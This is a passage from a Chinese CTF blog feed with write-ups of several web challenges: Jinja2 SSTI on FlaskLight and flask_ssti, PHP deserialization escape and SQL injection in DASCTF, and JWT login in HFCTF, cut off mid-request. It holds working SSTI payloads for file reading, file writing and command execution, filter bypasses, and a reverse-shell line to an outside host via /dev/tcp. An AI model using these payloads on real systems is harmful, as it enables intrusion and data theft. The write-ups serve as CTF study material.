href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://evoa.me/archives/13/">https://evoa.me/archives/13/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>无字符webshell</tag>
      
      <tag>windows下文件名的一些构造</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CSCCTF 2019 Qual]FlaskLight延展Jinja2总结</title>
    <link href="/2020/04/28/CSCCTF-2019-Qual-FlaskLight%E5%BB%B6%E5%B1%95%E5%88%B0SSTI-Jinja2/"/>
    <url>/2020/04/28/CSCCTF-2019-Qual-FlaskLight%E5%BB%B6%E5%B1%95%E5%88%B0SSTI-Jinja2/</url>
    
    <content type="html"><![CDATA[<h2 id="CSCCTF-2019-Qual-FlaskLight-解题"><a href="#CSCCTF-2019-Qual-FlaskLight-解题" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight 解题"></a>[CSCCTF 2019 Qual]FlaskLight 解题</h2><p>查看源码</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Parameter Name: search --&gt;</span><span class="hljs-comment">&lt;!-- Method: GET --&gt;</span></code></pre><p>/?search=49结果为 7777777判断为Jinja2 , 然后就是bypass</p><pre><code class="hljs handlebars"><span class="xml">/?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__[2].__subclasses__</span>()[258](<span class="hljs-name">&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="xml">OR</span><span class="xml">?search=&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>()._module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">request.args.input</span>).read()&#125;&#125;</span><span class="xml">&#123;%endif%&#125;&#123;%endfor%&#125;</span><span class="xml">&amp;input=cat /flasklight/coomme_geeeett_youur_flek </span></code></pre><h2 id="Jinja2-SSTI-步骤"><a href="#Jinja2-SSTI-步骤" class="headerlink" title="Jinja2   SSTI 步骤"></a>Jinja2   SSTI 步骤</h2><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-string">&#x27;7&#x27;</span>&#125;&#125;</span><span class="xml"> </span><span class="xml">7777777 为Jinja2</span><span class="xml">49为Twig</span></code></pre><h3 id="显示所有的类"><a href="#显示所有的类" class="headerlink" title="显示所有的类"></a>显示所有的类</h3><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">[].class.base.subclasses</span>() &#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.class.mro</span>()[1].subclasses()&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__[2].__subclasses__</span>() &#125;&#125;</span></code></pre><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code class="hljs handlebars"><span class="xml"># &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] = File class</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__[2].__subclasses__</span>()[40](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.items</span>()[4][1].__class__.__mro__[2].__subclasses__()[40](<span class="hljs-name">&quot;/tmp/flag&quot;</span>).read() &#125;&#125;</span></code></pre><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__[2].__subclasses__</span>()[40](<span class="hljs-name">&#x27;/var/www/html/myflaskapp/hello.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-name">&#x27;Hello here !&#x27;</span>) &#125;&#125;</span></code></pre><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen"></a>subprocess.Popen</h4><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.mro</span>()[1].__subclasses__()[396](<span class="hljs-name">&#x27;cat flag.txt&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__[&#x27;os&#x27;].popen</span>(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="xml">396会根据题目的不同而不同，可以用</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.class.mro</span>()[1].subclasses()&#125;&#125;</span><span class="xml">看</span></code></pre><h4 id="Popen-不用猜测偏移量"><a href="#Popen-不用猜测偏移量" class="headerlink" title="Popen 不用猜测偏移量"></a>Popen 不用猜测偏移量</h4><pre><code class="hljs handlebars"><span class="xml">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>()._module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">request.args.input</span>).read()&#125;&#125;</span><span class="xml">&#123;%endif%&#125;&#123;%endfor%&#125;</span><span class="xml">传一个input=ls</span><span class="xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__[&#x27;__builtins__&#x27;].open</span>(<span class="hljs-name">&#x27;flog&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span></code></pre><h4 id="利用配置文件"><a href="#利用配置文件" class="headerlink" title="利用配置文件"></a>利用配置文件</h4><pre><code class="hljs handlebars"><span class="xml"># evil config</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__[2].__subclasses__</span>()[40](<span class="hljs-name">&#x27;/tmp/evilconfig.cfg&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-name">&#x27;from subprocess import check_output\n\nRUNCMD = check_output\n&#x27;</span>) &#125;&#125;</span><span class="xml"> </span><span class="xml"># load the evil config</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.from_pyfile</span>(<span class="hljs-name">&#x27;/tmp/evilconfig.cfg&#x27;</span>) &#125;&#125;</span><span class="xml">  </span><span class="xml"># connect to evil host</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config[&#x27;RUNCMD&#x27;]</span>(<span class="hljs-name">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1&quot;&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>) &#125;&#125;</span><span class="xml"> </span></code></pre><p>####bypass</p><pre><code class="hljs vbscript"><span class="hljs-built_in">request</span>.__class__<span class="hljs-built_in">request</span>[<span class="hljs-string">&quot;__class__&quot;</span>]</code></pre><p>看这两个</p><p>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2]">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection#jinja2)</p><p><a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p><h3 id="补题"><a href="#补题" class="headerlink" title="补题"></a>补题</h3><h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>过滤了<code>. _\</code></p><pre><code class="hljs python">&#123;&#123;()[<span class="hljs-string">&quot;__class__&quot;</span>][<span class="hljs-string">&quot;__bases__&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;__subclasses__&quot;</span>]()[<span class="hljs-number">80</span>][<span class="hljs-string">&quot;load_module&quot;</span>](<span class="hljs-string">&quot;os&quot;</span>)[<span class="hljs-string">&quot;system&quot;</span>](<span class="hljs-string">&quot;ls&quot;</span>)&#125;&#125;//用&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">_frozen_importlib</span>.<span class="hljs-title">BuiltinImporter</span>&#x27;&gt;这个去执行命令</span><span class="hljs-class"></span>&#123;&#123;()[&quot;__class__&quot;][&quot;__bases__&quot;][0][&quot;__subclasses__&quot;]()[91][&quot;get_data&quot;](0, &quot;app.py&quot;)&#125;&#125;//用&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">_frozen_importlib_external</span>.<span class="hljs-title">FileLoader</span>&#x27;&gt;这个去读取文件</span></code></pre><p>双引号内可以用16进制代替， 可以用来绕过</p><pre><code class="hljs python">&#123;&#123;()[<span class="hljs-string">&quot;\x5F\x5Fclass\x5F\x5F&quot;</span>][<span class="hljs-string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="hljs-number">80</span>][<span class="hljs-string">&quot;load\x5Fmodule&quot;</span>](<span class="hljs-string">&quot;os&quot;</span>)[<span class="hljs-string">&quot;system&quot;</span>](<span class="hljs-string">&quot;ls&quot;</span>)&#125;&#125;&#123;&#123;()[<span class="hljs-string">&quot;\x5F\x5Fclass\x5F\x5F&quot;</span>][<span class="hljs-string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="hljs-number">91</span>][<span class="hljs-string">&quot;get\x5Fdata&quot;</span>](<span class="hljs-number">0</span>, <span class="hljs-string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</code></pre><p>可以读/proc/self/fd/3查看删除的flag文件，也可以直接解密，加解密函数是同一个</p><p>在这儿抄的 <a href="https://www.cnblogs.com/peri0d/p/12900725.html">https://www.cnblogs.com/peri0d/p/12900725.html</a></p><p>SSTI 关键词</p><pre><code class="hljs angelscript"><span class="hljs-string">[</span><span class="hljs-string">]</span>(\)&#123;&#125;___.g<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&quot;&quot;</span>requestg<span class="hljs-keyword">namespace</span><span class="hljs-symbol">__dict__</span><span class="hljs-symbol">__class__</span><span class="hljs-symbol">__mro__</span><span class="hljs-symbol">__bases__</span><span class="hljs-symbol">__subclasses__</span><span class="hljs-symbol">__init__</span><span class="hljs-symbol">__globals__</span><span class="hljs-symbol">self</span><span class="hljs-symbol">config</span><span class="hljs-symbol">url_for</span><span class="hljs-symbol">get_flashed_messages</span><span class="hljs-symbol">lipsum</span><span class="hljs-symbol">current_app</span><span class="hljs-symbol">range</span><span class="hljs-symbol">session</span><span class="hljs-symbol">dict</span><span class="hljs-symbol">get_flashed_messages</span><span class="hljs-symbol">cycler</span><span class="hljs-symbol">joiner</span><span class="hljs-symbol">__builtins__</span><span class="hljs-symbol">__import__</span><span class="hljs-symbol">eval</span><span class="hljs-symbol">keys</span><span class="hljs-symbol">index</span><span class="hljs-symbol">values</span><span class="hljs-symbol">popen</span><span class="hljs-symbol">read</span><span class="hljs-symbol">_TemplateReference__context</span><span class="hljs-symbol">environ</span><span class="hljs-symbol">application</span><span class="hljs-symbol">_get_data_for_json</span><span class="hljs-symbol">JSONEncoder</span><span class="hljs-symbol">default</span><span class="hljs-symbol">system</span><span class="hljs-symbol">flag</span>*?<span class="hljs-symbol">import</span><span class="hljs-symbol">_IterationGuard</span><span class="hljs-symbol">catch_warnings</span><span class="hljs-symbol">_ModuleLock</span><span class="hljs-symbol">flag</span><span class="hljs-symbol">chr</span><span class="hljs-symbol">subprocess</span><span class="hljs-symbol">commands</span><span class="hljs-symbol">socket</span><span class="hljs-symbol">hex</span><span class="hljs-symbol">base64</span></code></pre><p>模块位置寻找</p><pre><code class="hljs django"><span class="xml">Copy</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; [].__class__.__base__.__subclasses__().index(c) &#125;&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安恒月赛 DASCTF</title>
    <link href="/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF/"/>
    <url>/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>show_source(<span class="hljs-string">&quot;index.php&quot;</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> str_replace(chr(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$data</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, chr(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . chr(<span class="hljs-number">0</span>), <span class="hljs-variable">$data</span>);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$a</span>;        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$b</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;gqy&#x27;</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$c</span> = <span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;b;        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">//flag.php</span>        <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;c);        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;nice&#x27;</span>;    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<span class="hljs-comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><span class="hljs-variable">$b</span> = unserialize(read(write(serialize(<span class="hljs-variable">$a</span>))));</code></pre><p>反序列化字符逃逸，\0\0\0替换成了chr(0) . ‘*’ . chr(0) ，字符减少了3，也就是可以吃掉3个字符，比较一下</p><pre><code class="hljs css">#正常的<span class="hljs-selector-tag">payload</span><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:&quot;A&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;&#125;#需要的<span class="hljs-selector-tag">payload</span><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:&quot;A&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;&#125;&#125;</code></pre><p>分析一下 username,password可控，我们需要控制password指向B类，需要吃掉<code>&quot;;s:8:&quot;password&quot;;s:22:&quot;</code>23位，单是吃掉的只能是3的整数呗 所以我们加一个字符a凑数。</p><pre><code class="hljs taggerscript">a=<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>吃掉24位b=a&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</code></pre><p>ps. pop链很容易就不说了</p><h1 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h1><ol><li><p>看注释有<code>select * from user where username=&#39;$user&#39; and password=&#39;%s</code> </p><p><a href="https://blog.csdn.net/weixin_41185953/article/details/80485075">https://blog.csdn.net/weixin_41185953/article/details/80485075</a> ,格式化字符串的漏洞</p><pre><code class="hljs ini"><span class="hljs-attr">1. user</span>=%<span class="hljs-number">1</span>$&amp;passwd=^<span class="hljs-number">0</span><span class="hljs-comment">#</span><span class="hljs-attr">2. user</span>=%<span class="hljs-number">1</span><span class="hljs-variable">$c</span> or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">#&amp;passwd=39</span></code></pre></li><li><p>登录后</p><pre><code class="hljs php">Your sandbox: ./shells/N2d6gGGkG2U2UZ2D/ set your shell<span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);session_save_path(<span class="hljs-string">&#x27;session&#x27;</span>);session_start();<span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;./init.php&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]!=<span class="hljs-number">1</span>)&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php&#x27;&lt;/script&gt;&quot;</span>);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>])&#123;    <span class="hljs-variable">$shell</span>= addslashes(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);    <span class="hljs-variable">$file</span> = file_get_contents(<span class="hljs-string">&#x27;./shell.php&#x27;</span>);    <span class="hljs-variable">$file</span> = preg_replace(<span class="hljs-string">&quot;/\\\$shell = &#x27;.*&#x27;;/s&quot;</span>, <span class="hljs-string">&quot;\$shell = &#x27;<span class="hljs-subst">&#123;$shell&#125;</span>&#x27;;&quot;</span>, <span class="hljs-variable">$file</span>);    file_put_contents(<span class="hljs-string">&#x27;./shell.php&#x27;</span>, <span class="hljs-variable">$file</span>);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;set your shell&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;    chdir(<span class="hljs-string">&quot;/&quot;</span>);    highlight_file(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&quot;/admin.php&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html</a></p><p>直接写shell</p></li><li><p>接下来就是要绕disable_functions,不会</p><p><a href="https://jiang-niao.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E5%9B%9B%E6%9C%88wp/">https://jiang-niao.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E5%9B%9B%E6%9C%88wp/</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DASCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虎符CTF</title>
    <link href="/2020/04/24/%E8%99%8E%E7%AC%A6CTF/"/>
    <url>/2020/04/24/%E8%99%8E%E7%AC%A6CTF/</url>
    
    <content type="html"><![CDATA[<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><ol><li><p>koa-static 源码泄露</p><p>配置错了，所有的源码可以通过路由访问到</p><p>主要的逻辑源码在/controllers/api.js</p><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<span class="hljs-keyword">const</span> APIError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).APIError;<span class="hljs-built_in">module</span>.exports = &#123;    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);        &#125;        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">global</span>.secrets.length &gt; <span class="hljs-number">100000</span>) &#123;            <span class="hljs-built_in">global</span>.secrets = [];        &#125;        <span class="hljs-keyword">const</span> secret = crypto.randomBytes(<span class="hljs-number">18</span>).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);        <span class="hljs-keyword">const</span> secretid = <span class="hljs-built_in">global</span>.secrets.length;        <span class="hljs-built_in">global</span>.secrets.push(secret)        <span class="hljs-keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);        ctx.rest(&#123;            token: token        &#125;);        <span class="hljs-keyword">await</span> next();    &#125;,    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;        <span class="hljs-keyword">if</span>(!username || !password) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);        &#125;        <span class="hljs-keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        <span class="hljs-keyword">const</span> sid = <span class="hljs-built_in">JSON</span>.parse(Buffer.from(token.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).toString()).secretid;        <span class="hljs-built_in">console</span>.log(sid)        <span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);        &#125;        <span class="hljs-keyword">const</span> secret = <span class="hljs-built_in">global</span>.secrets[sid];        <span class="hljs-keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);        <span class="hljs-keyword">const</span> status = username === user.username &amp;&amp; password === user.password;        <span class="hljs-keyword">if</span>(status) &#123;            ctx.session.username = username;        &#125;        ctx.rest(&#123;            status        &#125;);        <span class="hljs-keyword">await</span> next();    &#125;,    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);        &#125;        <span class="hljs-keyword">const</span> flag = fs.readFileSync(<span class="hljs-string">&#x27;/flag&#x27;</span>).toString();        ctx.rest(&#123;            flag        &#125;);        <span class="hljs-keyword">await</span> next();    &#125;,    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        ctx.session.username = <span class="hljs-literal">null</span>;        ctx.rest(&#123;            status: <span class="hljs-literal">true</span>        &#125;)        <span class="hljs-keyword">await</span> next();    &#125;&#125;;</code></pre></li><li><p>审计一下，如果不是很清楚就抓包走一下整个过程</p><p>登录的包</p><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /api/login HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">5</span>ddeef<span class="hljs-number">75</span>-<span class="hljs-number">8</span>ef<span class="hljs-number">2</span>-<span class="hljs-number">4</span>f<span class="hljs-number">5</span>c-aa<span class="hljs-number">17</span>-<span class="hljs-number">0</span>e<span class="hljs-number">0</span>a<span class="hljs-number">25</span>b<span 